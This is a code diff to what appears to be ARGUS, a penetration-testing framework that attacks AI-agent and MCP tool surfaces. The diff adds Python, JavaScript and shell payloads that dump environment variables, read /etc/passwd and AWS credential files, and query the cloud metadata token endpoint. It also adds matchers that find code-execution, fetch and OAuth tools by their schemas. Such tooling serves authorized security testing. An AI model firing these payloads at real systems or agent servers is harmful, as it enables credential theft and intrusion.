@@ -568,7 +568,6 @@ def _oauth_scope_enum_payloads(
     surface: Surface, ctx: ProbeContext,
 ) -> list[dict]:
     """EP-T6: OAuth scope-enumeration via URL-shape tools."""
-    _ = ctx
     urls = (
         "https://oauth2.googleapis.com/tokeninfo"
         "?access_token=$TOKEN",
@@ -649,41 +648,99 @@ def _code_run_pivot_payloads(
     surface: Surface, ctx: ProbeContext,
 ) -> list[dict]:
     """
-    EP-T11 — code-run pivot. Targets GenericAgent-class ``code_run``
-    (and equivalent `run_code` / `python_exec` / `eval`) surfaces —
-    the single highest-value primitive in the autonomous-agent threat
-    model. A landing means the target will install arbitrary packages,
-    write scripts, and call external APIs on the attacker's behalf.
+    EP-T11 — code-run pivot. Targets any tool whose job is to
+    execute attacker-supplied code — the single highest-value
+    primitive in the autonomous-agent threat model. A landing means
+    the target will install arbitrary packages, write scripts, and
+    call external APIs on the attacker's behalf.
 
-    Each payload is a benign-looking Python snippet that, if the
-    surface actually evaluates code, emits a response containing
-    credential-like / environment-like content the EP-11 detector
-    layer already knows how to score. No remote side effects —
-    payloads read local state only so the probe is safe to fire in
+    Payload set spans THREE runtimes so the probe works against
+    Python-flavoured sandboxes (``run_python``, ``code_run``),
+    JavaScript-flavoured sandboxes (``run_js``, ``sandbox_exec`` on
+    Node-backed servers like node-code-sandbox-mcp), and shell-
+    runner tools (``shell_exec``, ``bash_exec``). ARGUS fires all
+    three — the target's sandbox picks the one its runtime parses;
+    the other two either noop or syntax-error without side effect.
+
+    Each payload reads local state only (env / AWS creds / pip
+    inventory). No remote side effects — safe in authorized
     pen-test engagements.
+
+    When the target's schema exposes a ``language`` field (common
+    pattern on multi-runtime sandboxes), we fire each snippet with
+    the matching language hint AND without — either plumbing path
+    lands.
     """
-    snippets = (
-        # Snippet A — environment dump via Python stdlib.
+    # ── Python snippets ─────────────────────────────────────────
+    py_snippets = (
         "import os; print('\\n'.join(f'{k}={v}' for k, v "
         "in os.environ.items()))",
-        # Snippet B — IMDSv2 reachability check via Python.
-        "import urllib.request as u, json; "
+        "import urllib.request as u; "
         "r = u.urlopen('http://169.254.169.254/latest/api/"
         "token', timeout=1); print(r.read()[:200])",
-        # Snippet C — known SaaS credential file read.
         "import pathlib; "
         "p = pathlib.Path.home() / '.aws' / 'credentials'; "
         "print(p.read_text()[:400] if p.exists() else 'no-aws')",
-        # Snippet D — request to pip / distinct install surface (the
-        # autonomous-agent "crystallise a tool" hazard).
         "import subprocess; "
-        "print(subprocess.run(['pip', 'list', '--format=freeze'], "
+        "print(subprocess.run(['cat', '/etc/passwd'], "
         "capture_output=True, text=True).stdout[:400])",
     )
-    out = _code_payloads(surface, snippets)
+    # ── JavaScript / Node snippets ──────────────────────────────
+    js_snippets = (
+        "console.log(JSON.stringify(process.env))",
+        "console.log(require('fs').readFileSync('/etc/passwd', 'utf8'))",
+        "console.log(require('child_process').execSync("
+        "'env').toString())",
+        "const https = require('http'); "
+        "https.get('http://169.254.169.254/latest/api/token', "
+        "(r) => { let d=''; r.on('data', c => d+=c); "
+        "r.on('end', () => console.log(d)); }).on('error', "
+        "e => console.log('err ' + e.message));",
+        "const fs = require('fs'); const os = require('os'); "
+        "try { console.log(fs.readFileSync("
+        "os.homedir() + '/.aws/credentials', 'utf8')); } "
+        "catch (e) { console.log('no-aws'); }",
+    )
+    # ── Shell / Bash snippets ───────────────────────────────────
+    shell_snippets = (
+        "env",
+        "cat /etc/passwd 2>/dev/null | head -20",
+        "cat ~/.aws/credentials 2>/dev/null || echo no-aws",
+        "curl -sf --max-time 2 http://169.254.169.254/latest/api/token",
+    )
+
+    all_snippets = tuple(py_snippets) + tuple(js_snippets) + tuple(shell_snippets)
+
+    # Try schema-aware payload routing first. _code_payloads plugs
+    # the snippet into the schema's code/script/source field; if
+    # the schema has a ``language`` field we also annotate so the
+    # target knows which runtime to invoke.
+    out = _code_payloads(surface, all_snippets)
+    props = (surface.schema or {}).get("properties") or {}
+    has_language_hint = any(
+        k in props for k in ("language", "lang", "runtime", "interpreter")
+    )
+    if out and has_language_hint:
+        # Extend with language-hinted variants so servers that
+        # require an explicit language field also land.
+        lang_field = next(
+            (k for k in ("language", "lang", "runtime", "interpreter")
+             if k in props), "language",
+        )
+        hinted: list[dict] = []
+        for p in out[:len(py_snippets)]:
+            hinted.append({**p, lang_field: "python"})
+        for p in out[len(py_snippets):len(py_snippets) + len(js_snippets)]:
+            hinted.append({**p, lang_field: "javascript"})
+        for p in out[len(py_snippets) + len(js_snippets):]:
+            hinted.append({**p, lang_field: "bash"})
+        out = hinted + out
+
     if out:
         return out
-    return [{"code": s} for s in snippets]
+    # Schema-less fallback — fire the raw code field; works against
+    # legacy labrats that don't declare schemas.
+    return [{"code": s} for s in all_snippets]
 
 
 # ── Technique registry ──────────────────────────────────────────────────────
@@ -719,67 +776,92 @@ class Technique:
     severity:       str = "CRITICAL"
 
 
+# ── Surface matchers — schema-first, description fallback ─────────────
+#
+# Every matcher asks two questions:
+#
+#   1. Does the tool's declared JSON schema have a field of the shape
+#      this attack class needs? (path / url / command / code / query).
+#      If yes → match. Schema is authoritative.
+#
+#   2. If no schema declared (legacy labrats + servers that ship
+#      tools without inputSchema), fall back to description keyword
+#      phrases — NARROW phrases that describe the behaviour, not
+#      tool-name substring catalogs that lagged every new server.
+#
+# No more hand-maintained ''tool:run_js'' / ''tool:sandbox_exec''
+# keyword lists. Operators don't cater per-target; ARGUS reads the
+# target's declared shape and acts.
+
+
 def _is_exec_surface(s: Surface) -> bool:
-    n = s.name.lower()
-    # Substring match — "tool:read_file" etc. all contain the keyword.
-    return any(k in n for k in (
-        "tool:exec", "tool:run_command", "tool:shell", "tool:bash",
-        "tool:read_file", "tool:read", "tool:file_read", "tool:env",
-        # MCP reference-server ecosystem surface names. Observed
-        # across @modelcontextprotocol/server-filesystem, -memory,
-        # -git, -github, -everything.
-        "tool:write_file", "tool:edit_file", "tool:move_file",
-        "tool:create_directory", "tool:directory_tree",
-        "tool:list_directory", "tool:search_files",
-        "tool:read_text_file", "tool:read_media_file",
-        "tool:read_multiple_files", "tool:get_file_info",
-        "tool:create_entities", "tool:create_relations",
-        "tool:add_observations", "tool:read_graph",
-        "tool:search_nodes", "tool:open_nodes",
-        "tool:get-env", "tool:get_env",
+    """True when the tool has a path-, command-, or code-shaped
+    input the cred/ssh/cloud/oauth-token-discovery probes can drive.
+    These probes run SOMETHING on the target — we don't distinguish
+    between ''shell command'', ''file path'', or ''code snippet'' at
+    the matcher level; the payload generators do that separately."""
+    schema = s.schema or {}
+    if (_primary_field(schema, _PATH_FIELDS)
+            or _primary_field(schema, _COMMAND_FIELDS)
+            or _primary_field(schema, _CODE_FIELDS)):
+        return True
+    d = (s.description or "").lower()
+    return any(phrase in d for phrase in (
+        "execute", "read file", "write file", "shell", "command",
+        "run code", "sandbox", "filesystem",
     ))
 
 
 def _is_fetch_surface(s: Surface) -> bool:
-    n = s.name.lower()
-    return any(k in n for k in (
-        "tool:fetch", "tool:http", "tool:url", "tool:get",
-        "tool:web", "tool:browse", "tool:request",
-        # MCP ecosystem fetch surfaces.
-        "tool:scrape", "tool:crawl", "tool:fetch_url",
-        "tool:ingest_url",
+    """True when the tool takes a URL — IMDS-SSRF, OAuth scope-enum,
+    workspace-pivot, PaaS-env-pivot all drive a URL into such a
+    tool. Schema-first: if the declared shape has a URL-like field,
+    match."""
+    schema = s.schema or {}
+    if _primary_field(schema, _URL_FIELDS):
+        return True
+    d = (s.description or "").lower()
+    return any(phrase in d for phrase in (
+        "fetch", "http request", "download", "web request",
+        "browse url", "retrieve url",
+    ))
+
+
+def _is_code_run_surface(s: Surface) -> bool:
+    """True when the tool accepts attacker-supplied code — the
+    single highest-value primitive for the sandbox-escape class
+    (CVE-2025-53372 et al). Schema-first: if the declared shape
+    has a code/script/snippet field, match; no keyword name list."""
+    if _primary_field(s.schema or {}, _CODE_FIELDS):
+        return True
+    d = (s.description or "").lower()
+    return any(phrase in d for phrase in (
+        "execute code", "run code", "run javascript",
+        "run python", "code execution", "sandbox",
     ))
 
 
 def _is_oauth_surface(s: Surface) -> bool:
-    n = s.name.lower()
+    """OAuth-related surfaces for scope-overgrant / third-party-AI
+    audits. These are metadata checks (description + schema keys),
+    not probe surfaces — keep description-keyword matching but
+    include schema-key introspection too."""
+    schema = s.schema or {}
+    props = (schema.get("properties") or {}) if isinstance(schema, dict) else {}
+    for k in props.keys():
+        kl = str(k).lower()
+        if "oauth" in kl or "scope" in kl or "token" in kl:
+            return True
     d = (s.description or "").lower()
-    return ("oauth" in n or "oauth" in d or "token" in n or
-            "auth" in n or "workspace" in d or "integration" in d)
-
-
-def _is_code_run_surface(s: Surface) -> bool:
-    """
-    EP-T11 surface matcher. The GenericAgent-class primitive: a tool
-    whose job is to execute attacker-supplied code. Includes
-    ``code_run`` (lsdefine/GenericAgent), ``tool:eval`` /
-    ``tool:python_exec`` / ``tool:run_code`` and any tool whose
-    description explicitly mentions executing arbitrary code.
-    """
-    n = s.name.lower()
-    d = (s.description or "").lower()
-    if any(k in n for k in (
-        "tool:code_run", "tool:run_code", "tool:python_exec",
-        "tool:python_run", "tool:eval", "tool:execute_code",
-    )):
-        return True
-    return ("execute arbitrary code" in d
-            or "run arbitrary code" in d
-            or "python repl" in d
-            or "code execution" in d)
+    return ("oauth" in d or "token" in d
+            or "workspace" in d or "integration" in d)
 
 
 TECHNIQUES: dict[str, Technique] = {
+    # EP-T1/T2/T3/T5 — each drives attack content into a tool that
+    # takes path/command/code inputs. The shared ``_is_exec_surface``
+    # matcher is schema-first (tool declares a path/command/code
+    # field) with description fallback. No tool-name keyword list.
     "EP-T1-cred-surface-scan": Technique(
         id="EP-T1-cred-surface-scan", family="A", kind="probe",
         payload_fn=_cred_surface_scan_payloads,
@@ -792,6 +874,8 @@ TECHNIQUES: dict[str, Technique] = {
         id="EP-T3-cloud-cred-probe", family="A", kind="probe",
         payload_fn=_cloud_cred_probe_payloads,
         surface_match=_is_exec_surface),
+    # EP-T4/T6/T9/T10 — URL-shape attacks (IMDS SSRF, OAuth scope,
+    # Workspace/PaaS pivots). Matcher: schema has url-like field.
     "EP-T4-imds-ssrf-probe": Technique(
         id="EP-T4-imds-ssrf-probe", family="A", kind="probe",
         payload_fn=_imds_ssrf_probe_payloads,
@@ -821,6 +905,9 @@ TECHNIQUES: dict[str, Technique] = {
         id="EP-T10-paas-envvar-pivot", family="D", kind="probe",
         payload_fn=_paas_envvar_pivot_payloads,
         surface_match=_is_fetch_surface),
+    # EP-T11 — code-run pivot. Matcher: schema has code-like field.
+    # This is the fix that would have caught CVE-2025-53372 /
+    # node-code-sandbox-mcp's run_js tool without a name list.
     "EP-T11-code-run-pivot": Technique(
         id="EP-T11-code-run-pivot", family="A", kind="probe",
         payload_fn=_code_run_pivot_payloads,
